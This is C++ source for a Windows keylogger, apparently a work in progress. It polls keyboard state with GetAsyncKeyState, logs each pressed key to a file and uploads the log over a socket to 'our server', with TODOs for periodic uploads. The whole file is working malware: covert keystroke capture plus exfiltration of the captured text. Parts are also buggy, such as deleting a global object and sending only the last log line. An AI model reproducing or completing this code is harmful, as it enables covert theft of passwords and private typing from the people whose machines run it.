#include "keylogger.h"
#include "utils.h"
#include "Client.h"

using namespace std;

// indicate keylogger state (used in the loop)
bool IsKeyLoggerRunning = false;

LogFile log_file;

void KeyLoggerLoop()
{
	char key[2];
	while (IsKeyLoggerRunning)
	{
		for (int i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
			
				key[0] = (char)MapVirtualKeyA(i, MAPVK_VK_TO_CHAR);
				key[1] = 0;
				MessageBoxA(0, key, "KEY", MB_OK); // just to debug
				log_file.AppendString((char*)key);
			}
		}
		Sleep(100);
	}
}

void StopKeyLogger()
{
	IsKeyLoggerRunning = false;
}

void StartKeyLogger()
{
	// do initialization code
	IsKeyLoggerRunning = true;
	Client* client = new Client();
	
	// finally loop
	KeyLoggerLoop();

	// do finalization code
	delete &log_file;
}

/*
    UploadLog is a function to upload the most recent version of the
    log.txt file to our server.  It accepts a Client* as a parameter
    and sends log.txt through that connection.
    TODO:
    -Implement periodic uploads i.e. once a day
    -Keep this client listening for requests to upload
*/
void UploadLog(Client* localClient)
{
     string line;
     ifstream file ("log.txt");
     if(file.is_open())
     {
         while(getline(file, line))
         {
             cout << line << '\n';
         }
         file.close();
     } else cout << "Unable to open file";
     const unsigned int packet_size = line.size() + 1;
     char packet_data[packet_size];
     strcpy(packet_data, line.c_str());
     send(localClient->connectSocket, packet_data, sizeof(packet_data), 0);
     closesocket(localClient->connectSocket);
}